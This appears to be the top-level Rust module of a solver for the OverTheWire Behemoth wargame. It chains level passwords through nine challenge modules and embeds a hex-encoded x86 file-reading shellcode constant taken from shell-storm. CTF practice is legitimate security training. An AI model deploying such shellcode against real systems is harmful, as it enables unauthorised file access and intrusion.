use anyhow::Result;

const HOST: &str = "behemoth.labs.overthewire.org";
const PORT: u16 = 2221;

/// https://shell-storm.org/shellcode/files/shellcode-73.html
const READ_FILE_SHELLCODE : &str = "31C031DB31C931D2EB325BB00531C9CD8089C6EB06B00131DBCD8089F3B00383EC018D0C24B201CD8031DB39C374E6B004B301B201CD8083C401EBDFE8C9FFFFFF";

mod behemoth0;
mod behemoth1;
mod behemoth2;
mod behemoth3;
mod behemoth4;
mod behemoth5;
mod behemoth6;
mod behemoth7;
mod behemoth8;

/// challenges 0 through 8
pub fn solve_all() -> Result<()> {
    println!("LETS DO BEHEMOTH SHALL WE...\n");

    let pass_1 = behemoth0::solve("behemoth0")?;
    let pass_2 = behemoth1::solve(&pass_1)?;
    let pass_3 = behemoth2::solve(&pass_2)?;
    let pass_4 = behemoth3::solve(&pass_3)?;
    let pass_5 = behemoth4::solve(&pass_4)?;
    let pass_6 = behemoth5::solve(&pass_5)?;
    let pass_7 = behemoth6::solve(&pass_6)?;
    let pass_8 = behemoth7::solve(&pass_7)?;
    behemoth8::solve(&pass_8)?;

    println!("\nALL DONE!!!!");

    Ok(())
}
